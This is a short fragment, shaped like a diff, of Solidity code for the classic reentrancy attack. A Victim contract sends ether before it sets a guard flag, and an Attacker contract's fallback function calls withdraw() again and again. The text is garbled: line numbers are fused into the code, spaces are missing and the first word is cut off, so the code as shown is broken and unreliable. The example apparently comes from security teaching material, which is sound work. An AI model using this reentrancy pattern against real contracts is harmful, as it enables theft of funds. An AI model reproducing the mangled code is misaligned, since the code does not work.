@@ -1,0 +1,1 @@
+ontractVictim {2boolflag =false;3functionwithdraw() {4if (flag || !msg.sender.call.value(1 wei)())throw;5flag =true;6}7}8contractAttacker {9uintcount = 0;10function() payable{11if(++count < 10) Victim(msg.sender).withdraw();12}13}
